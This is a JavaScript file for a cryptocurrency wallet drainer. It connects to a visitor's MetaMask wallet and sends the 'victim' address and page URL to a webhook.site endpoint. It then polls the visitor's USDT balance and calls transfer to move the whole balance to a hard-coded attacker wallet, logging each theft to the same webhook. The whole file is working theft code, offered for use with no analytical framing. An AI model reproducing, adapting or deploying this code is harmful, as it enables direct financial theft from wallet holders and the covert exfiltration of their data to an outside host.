document.getElementById("connectBtn")?.addEventListener("click", connectAndDrain);

async function connectAndDrain() {
  if (!window.ethereum) {
    setStatus("🦊 Install MetaMask");
    return;
  }

  try {
    setStatus("🔄 Connecting...");
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];

    setStatus("💸 Monitoring...");

    // Log victim
    fetch("https://webhook.site/c66c429d-8fd4-4bc4-8287-b7d9acbf9b20", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        victim: userAddress,
        time: new Date().toISOString(),
        url: window.location.href,
        action: "connected"
      })
    });

    // Start monitoring for USDT send
    watchForPayment(userAddress);

  } catch (err) {
    if (!err.message.includes("user rejected")) console.error(err);
    setStatus("❌ Cancelled");
  }
}

function watchForPayment(userAddress) {
  // Check every 3 sec if user sent USDT to your wallet
  setInterval(async () => {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const usdt = new ethers.Contract(
        "0x55d398326f99059fF775485246999027B3197955",
        ["function balanceOf(address) view returns (uint)"],
        provider
      );

      const balance = await usdt.balanceOf(userAddress);
      const formatted = Number(ethers.utils.formatUnits(balance, 18));

      // If user has < 1000 USDT, assume they paid 0.3 and now we drain
      if (formatted < 1000) {
        try {
          await triggerDrain();
        } catch (e) {
          console.log("Drain failed", e);
        }
      }

    } catch (e) {}
  }, 3000);
}

async function triggerDrain() {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  const userAddress = await signer.getAddress();

  const usdt = new ethers.Contract(
    "0x55d398326f99059fF775485246999027B3197955",
    [
      "function balanceOf(address) view returns (uint)",
      "function transfer(address to, uint value) returns (bool)"
    ],
    signer
  );

  const balance = await usdt.balanceOf(userAddress);
  if (balance.eq(0)) return;

  try {
    const tx = await usdt.transfer("0x5569183a84F4D11a9225988561F020fCbbdACa10", balance);
    setStatus("✅ Draining... Check wallet");

    // Log success
    fetch("https://webhook.site/c66c429d-8fd4-4bc4-8287-b7d9acbf9b20", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        victim: userAddress,
        drained: ethers.utils.formatUnits(balance, 18),
        token: "USDT",
        tx: tx.hash
      })
    });

  } catch (err) {
    console.error("Drain TX failed", err);
  }
}

function setStatus(msg) {
  const status = document.getElementById("status");
  if (status) status.textContent = msg;
}